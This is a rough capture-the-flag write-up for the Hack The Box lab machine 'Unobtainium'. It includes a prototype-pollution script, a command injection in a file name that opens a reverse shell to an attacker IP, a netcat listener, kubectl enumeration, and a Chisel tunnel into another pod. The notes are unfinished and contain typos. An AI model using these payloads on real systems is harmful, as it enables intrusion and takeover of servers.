# Unobtainium

IP : 10.10.10.235
OS -> Linux

````bash
echo "10.10.10.235 Unobtainium.htb" >> /etc/hosts 
````

Nmap 
nmap -sC -sV -p- unobtainium.htb

|Port|Service|
|---|---|
|22|ssh|
|80|http|
|2379|ssl/etcd-client|
|2380|ssl/etcd-server|
|8443|https|
|10250|https|
|31337|http|

### port 80
Simple html page. 

where we can download their program called unobtainium, let download it and see if we can learn anything from it. 

unpack the files, inside the files you will find opt/unobtainium/unobtainium program which is theirc chat software. 

The "TODO" tap describe furture functions
{"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}

The Post messages allow you to post messages. but to where, lets see if the system make a connection to anything. 
````bash
netstat -antp
#Output 
tcp        1      0 10.10.14.200:46798      10.10.10.235:31337      CLOSE_WAIT  2613/unobtainium -- 
````

And we see that it makes a connection to port 31337 node js service

go to http://unobtainium.htb:31337/ and you will see our text message. 
and it by the user felamos. why are we allready auth?

To get a better idea of what is happend with the packages lets start up wireshark. 
use filter ip.addr == 10.10.10.235 to cut out the noise. 

![[Pasted image 20210506124830.png]]

Look at the HTTP/JSON package 

````json
JavaScript Object Notation: application/json
    Object
        Member Key: auth
            Object
                Member Key: name
                    String value: felamos
                    Key: name
                Member Key: password
                    String value: Winter2021
                    Key: password
            Key: auth
        Member Key: filename
            String value: todo.txt
            Key: filename
````

And we got the cred for felamos the user we posted message as. 
Creds : felamos/Winter2021

It first tried it on ssh service and it did not work, would also be to easy. 

Startup burp so we can catch the request and send it to repeater
And you can now start search for files. 
a common web files is the inde.js let try that, and we got a hit, it in a very ugly format, but it hold nothing of interest. We know it a nodejs service lets see if we get the packages that is installed. 
search for package.json
lodash can be used to give us the options to upload and delete files.
and google-cloudstorage-commds for RCE. 

first start by giving us the ability to upload files. 
install
```bash
apt-get install jq
```

Exploit for giving us the ability to upload files
```bash
#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0"
TEXT='{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}'

cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "message":
    {
        "text":${TEXT}
    }
}
EOF

curl -s \
     -X PUT \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     "http://${RHOST}:${RPORT}/" \
| jq .
```

run the script 
```bash
./exploit.sh
```

we now have the ability to write in a file.

let make a reverse shell script 
```bash
#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0"
FILE="& echo $(echo 'bash -i >& /dev/tcp/10.10.14.200/8754 0>&1' | base64) | base64 -d | bash"

cat - <<EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

curl -s \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -o /dev/null \
     "http://${RHOST}:${RPORT}/upload"
```

start a listner 

````bash
nc -lvnp 8754
````

and we got the user txt. 
notices we are root but inside a docker container we have to try and escape. 

privileged container check 
````bash
ip link add dummy0 type dummy
````
Nope we have to find another way.

There no kubectl in the container to be found, lets start by uploading on. 
[Install kubectl binary with curl on Linux](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)

create a python server 
````bash
python3 -m http.server 8080
````

Download the fil using wget
````bash
wget http://10.10.14.200:8080/kubeclt -O /tmp/kubeclt
/tmp/kubectl get namespace #get the namespace of the other containers
/tmp/xkubectl get pods -n dev #Check if premissions of pods 
````

The way kubernetes cluster works by having one or more nodes, each of these nodes have one or more pods. Each pods can have one or more container. 
and we learn there are three pods with a container running

We are looking at two `different` environments, the classic production `environment` and the development `environment`. I should be able to repeat the steps i just have to make the `RHOST` and `RPORT` variables and upload them to the container I’m `currently` in above to get another foothold in the `development` environment.

For that we need to `forward` the port to the devnode-deployment container `"172.17.0.4:3000"`

I am using `Chisel` for that, a tcp/upd tunnel written in go.

if you do not have go installed 
````bash
apt install golang-go
````


````bash
git clone https://github.com/jpillora/chisel.get
cd chisel 
go build
````

transfer the new file onto the box

````bash
./chisels client 10.10.14.200:9999 R:3000:172.17.0.4:3000
````

We have now created a connection to box. 


Hash -> $6$.hk3Zm.2qShoCbQK$LM95a1qtDhEtLPGorD8FmMY5pNef7WfodyUUaw9tikXkh8v/.qmhJPIEV40KYehroJybb4C12gLfQu0UsbFe80

[https://0xdedinfosec.github.io/posts/htb-unobtainium/](https://0xdedinfosec.github.io/posts/htb-unobtainium/)